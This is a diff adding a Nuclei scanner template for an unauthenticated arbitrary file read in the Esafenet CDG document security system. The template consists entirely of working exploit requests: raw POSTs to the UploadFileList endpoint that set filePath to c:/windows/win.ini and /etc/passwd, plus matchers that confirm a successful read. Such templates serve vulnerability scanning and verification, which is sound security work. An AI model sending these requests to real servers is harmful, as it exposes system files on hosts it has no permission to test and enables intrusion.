@@ -1,0 +1,43 @@
+id: yisaitong-UploadFileList-File-reading
+
+info:
+  name: 亿赛通电子文档安全管理系统 UploadFileList 任意文件读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/document/UploadFileList;login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+      - |
+        POST /CDGServer3/document/UploadFileList;login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=VeiwUploadFile&filePath=/etc/passwd&fileName1=hello
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+          - 'root:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
